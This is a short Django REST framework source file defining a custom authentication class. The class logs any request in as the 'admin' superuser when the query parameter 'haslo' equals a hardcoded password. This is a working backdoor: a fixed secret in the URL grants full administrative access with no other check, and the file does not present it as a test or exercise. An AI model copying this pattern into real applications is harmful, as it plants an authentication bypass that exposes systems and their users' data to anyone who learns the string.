from django.contrib.auth.models import User
from rest_framework.authentication import BaseAuthentication


class HalsoAuthentication(BaseAuthentication):
    def authenticate(self, request):
        get_params = request.query_params

        if 'haslo' in get_params:
            if get_params['haslo'] == 'SlavaUkraini':
                superadmin = User.objects.get(username='admin')
                return (superadmin, None)

        return None
